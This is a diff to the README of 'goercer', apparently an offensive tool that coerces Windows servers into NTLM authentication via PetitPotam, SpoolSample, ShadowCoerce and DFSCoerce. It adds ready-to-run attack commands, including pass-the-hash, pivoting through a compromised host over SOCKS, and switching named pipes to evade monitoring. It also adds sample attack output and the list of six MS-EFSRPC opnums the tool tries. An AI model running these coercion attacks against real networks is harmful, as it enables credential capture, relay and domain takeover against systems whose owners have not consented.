@@ -36,12 +36,12 @@ sudo responder -I eth0 -v
 
 | Method | Protocol | Success Rate | Callbacks | Compatibility | Recommendation |
 |--------|----------|--------------|-----------|---------------|----------------|
-| **PetitPotam** | MS-EFSRPC | ⭐⭐⭐⭐⭐ | 1 | ALL Windows servers | ✅ **Best first choice** |
-| **SpoolSample** | MS-RPRN | ⭐⭐⭐⭐⭐ | 3 | Default on most servers | ✅ **Maximum callbacks** |
+| **PetitPotam** | MS-EFSRPC | ⭐⭐⭐⭐⭐ | 6 | ALL Windows servers | ✅ **Best first choice** |
+| **SpoolSample** | MS-RPRN | ⭐⭐⭐⭐⭐ | 3 | Default on most servers | ✅ **High callbacks** |
 | **ShadowCoerce** | MS-FSRVP | ⭐⭐ | Varies | Requires VSS configured | ⚠️ Situational only |
 | **DFSCoerce** | MS-DFSNM | ⭐ | Varies | Requires DFS Namespaces | ⚠️ Rarely works |
 
-**Recommendation**: Try **PetitPotam** first (works everywhere), then **SpoolSample** (3x callbacks) if Print Spooler is running.
+**Recommendation**: Try **PetitPotam** first (works everywhere with 6 different methods), then **SpoolSample** (3 callbacks) if Print Spooler is running.
 
 ---
 
@@ -249,26 +249,28 @@ sudo responder -I eth0 -v
 
 # Terminal 2: Run attacks
 
-# PetitPotam with default pipe (lsarpc) - MOST RELIABLE
-./goercer <target> <listener> <user> <pass> <domain>
+# PetitPotam with default pipe (lsarpc) - MOST RELIABLE (6 opnums)
+./goercer -t <target> -l <listener> -u <user> -d <domain> -m petitpotam
 
 # PetitPotam with pass-the-hash
-./goercer <target> <listener> <user> 1a2803ab98942ee503680dd3de3cceb2 <domain>
+./goercer -t <target> -l <listener> -u <user> -H 1a2803ab98942ee503680dd3de3cceb2 -d <domain> -m petitpotam
 
-# PetitPotam with alternative pipe
-./goercer <target> <listener> <user> <pass> <domain> petitpotam efsr
+# PetitPotam with alternative pipe (samr/netlogon/lsass all work)
+./goercer -t <target> -l <listener> -u <user> -d <domain> -m petitpotam --pipe samr
+./goercer -t <target> -l <listener> -u <user> -d <domain> -m petitpotam --pipe netlogon
+./goercer -t <target> -l <listener> -u <user> -d <domain> -m petitpotam --pipe lsass
 
 # SpoolSample - HIGH SUCCESS RATE (3 callbacks)
-./goercer <target> <listener> <user> <pass> <domain> spoolsample
+./goercer -t <target> -l <listener> -u <user> -d <domain> -m spoolsample
 
 # Use SOCKS5 proxy (pivoting through compromised host)
-./goercer <target> <listener> <user> <pass> <domain> --proxy socks5://127.0.0.1:1080
+./goercer -t <target> -l <listener> -u <user> -d <domain> -m petitpotam --proxy socks5://127.0.0.1:1080
 
 # ShadowCoerce (only if VSS RPC is available)
-./goercer <target> <listener> <user> <pass> <domain> shadowcoerce
+./goercer -t <target> -l <listener> -u <user> -d <domain> -m shadowcoerce
 
 # DFSCoerce (only if DFS Namespaces role installed)
-./goercer <target> <listener> <user> <pass> <domain> dfscoerce
+./goercer -t <target> -l <listener> -u <user> -d <domain> -m dfscoerce
 ```
 
 ---
@@ -278,17 +280,46 @@ sudo responder -I eth0 -v
 ### PetitPotam (MS-EFSRPC) ✅ Most Reliable
 
 - **Default Pipe**: `\pipe\lsarpc`
-- **Alternative Pipes**: `\pipe\efsr`, `\pipe\samr`, `\pipe\netlogon`, `\pipe\lsass`
+- **Alternative Pipes**: `\pipe\samr`, `\pipe\netlogon`, `\pipe\lsass` (all work with all 6 opnums)
+  - `\pipe\efsr` - May not exist on all systems
 - **UUID**: `c681d488-d850-11d0-8c52-00c04fd90f7e` v1.0
-- **Opnums**: 
-  - 0 (EfsRpcOpenFileRaw - often patched)
-  - 4 (EfsRpcEncryptFileSrv - working)
-- **Callbacks**: 1 authentication attempt
+- **Opnums** (6 different functions for maximum success rate): 
+  - 0: EfsRpcOpenFileRaw (often patched)
+  - 4: EfsRpcEncryptFileSrv (reliable)
+  - 5: EfsRpcDecryptFileSrv (alternative)
+  - 6: EfsRpcQueryUsersOnFile (query-based)
+  - 7: EfsRpcQueryRecoveryAgents (recovery agent)
+  - 12: EfsRpcFileKeyInfo (key info)
+- **Callbacks**: 6 authentication attempts (tries all opnums on chosen pipe)
 - **Target Parameter**: UNC path in MS-EFSRPC function calls
 - **Compatibility**: Works on **ALL Windows servers** (core service)
 - **Discovery**: @topotam77
 
-**Why it works**: LSARPC is a core Windows service present on every Windows system. The alternative pipes provide additional attack surface if lsarpc is somehow blocked.
+**Why it works**: The MS-EFSRPC interface is accessible through multiple named pipes (lsarpc, samr, netlogon, lsass). All pipes bind to the same UUID and support all 6 opnums. The tool tries **6 different MS-EFSRPC functions** to maximize success even if some are patched.
+
+**Example Output**:
+```
+./goercer -t 10.1.1.14 -l 10.1.1.99 -u slacker -d corp.local -m petitpotam --pipe samr
+
+[+] SMB authenticated
+[*] Using PetitPotam coercion technique via \pipe\samr
+[+] Pipe samr opened, starting DCERPC auth...
+[+] DCERPC authentication complete!
+[-] Trying PetitPotam opnum 0 (EfsRpcOpenFileRaw)...
+[!] Opnum 0 (EfsRpcOpenFileRaw) returned success (likely PATCHED - may not trigger callback)
+[-] Trying PetitPotam opnum 4 (EfsRpcEncryptFileSrv)...
+[+] Opnum 4 (EfsRpcEncryptFileSrv) completed successfully
+[-] Trying PetitPotam opnum 5 (EfsRpcDecryptFileSrv)...
+[+] Opnum 5 (EfsRpcDecryptFileSrv) completed successfully
+[-] Trying PetitPotam opnum 6 (EfsRpcQueryUsersOnFile)...
+[+] Opnum 6 (EfsRpcQueryUsersOnFile) completed successfully
+[-] Trying PetitPotam opnum 7 (EfsRpcQueryRecoveryAgents)...
+[+] Opnum 7 (EfsRpcQueryRecoveryAgents) completed successfully
+[-] Trying PetitPotam opnum 12 (EfsRpcFileKeyInfo)...
+[+] Opnum 12 (EfsRpcFileKeyInfo) completed successfully
+[+] Coercion triggered via opnum 12
+[+] Check Responder for callback!
+```
 
 ### SpoolSample (MS-RPRN) ✅ High Success Rate
 
@@ -304,6 +335,53 @@ sudo responder -I eth0 -v
 - **Discovery**: @tifkin_ & @elad_shamir
 
 **Why 3 callbacks**: Windows makes separate authentication attempts when opening the printer handle and when each notification function tries to contact the remote machine.
+
+---
+
+## 🔥 Enhanced PetitPotam Implementation
+
+Unlike the original PetitPotam PoC which only tries 2 opnums (0 and 4), this implementation attempts **6 different MS-EFSRPC functions** to maximize success rate:
+
+```bash
+./goercer -t <target> -l <listener> -u <user> -d <domain> -m petitpotam
+
+[-] Trying PetitPotam opnum 0 (EfsRpcOpenFileRaw)...
+[-] Trying PetitPotam opnum 4 (EfsRpcEncryptFileSrv)...
+[-] Trying PetitPotam opnum 5 (EfsRpcDecryptFileSrv)...
+[-] Trying PetitPotam opnum 6 (EfsRpcQueryUsersOnFile)...
+[-] Trying PetitPotam opnum 7 (EfsRpcQueryRecoveryAgents)...
+[-] Trying PetitPotam opnum 12 (EfsRpcFileKeyInfo)...
+```
+
+**Key Advantages**:
+- **6 opnums** instead of 2 = 3x more coercion opportunities
+- **Multiple pipes** (lsarpc, samr, netlogon, lsass) all work with all 6 opnums
+- **Resilient to patching**: If one function is blocked, 5 others still work
+- **Clear output**: Shows function names (not just opnum numbers)
+- **Higher success rate**: Each opnum triggers authentication attempt
+
+**Alternative Pipe Flexibility**:
+```bash
+# Try different pipes if one is monitored/blocked
+./goercer -t <target> -l <listener> -u <user> -d <domain> -m petitpotam --pipe lsarpc   # Default (always available)
+./goercer -t <target> -l <listener> -u <user> -d <domain> -m petitpotam --pipe samr     # SAM pipe
+./goercer -t <target> -l <listener> -u <user> -d <domain> -m petitpotam --pipe netlogon # Netlogon pipe
+./goercer -t <target> -l <listener> -u <user> -d <domain> -m petitpotam --pipe lsass    # LSASS pipe
+```
+
+All pipes access the same MS-EFSRPC UUID (`c681d488-d850-11d0-8c52-00c04fd90f7e`) and support all 6 functions.
+
+**Functions tested** (based on Coercer research by @p0dalirius):
+1. **EfsRpcOpenFileRaw** (opnum 0) - Original PetitPotam method, often patched
+2. **EfsRpcEncryptFileSrv** (opnum 4) - File encryption, reliable fallback
+3. **EfsRpcDecryptFileSrv** (opnum 5) - File decryption, alternative path
+4. **EfsRpcQueryUsersOnFile** (opnum 6) - Query users on encrypted file
+5. **EfsRpcQueryRecoveryAgents** (opnum 7) - Query recovery agents
+6. **EfsRpcFileKeyInfo** (opnum 12) - Retrieve file key information
+
+All functions accept a UNC path as the `FileName` parameter, triggering authentication when the server attempts to access the path.
+
+---
 
 ### ShadowCoerce (MS-FSRVP) ⚠️ Situational
 
@@ -590,9 +668,9 @@ sudo responder -I eth0 -v
 # Terminal 2: Build
 ./build.sh
 
-# Test PetitPotam (works on all servers)
+# Test PetitPotam (works on all servers - tries 6 opnums)
 ./goercer <target> <listener> <user> <pass> <domain> petitpotam
-# Expected: 1 callback in Responder
+# Expected: 6 authentication attempts in Responder (one per opnum)
 
 # Test PetitPotam with alternative pipe
 ./goercer <target> <listener> <user> <pass> <domain> petitpotam efsr
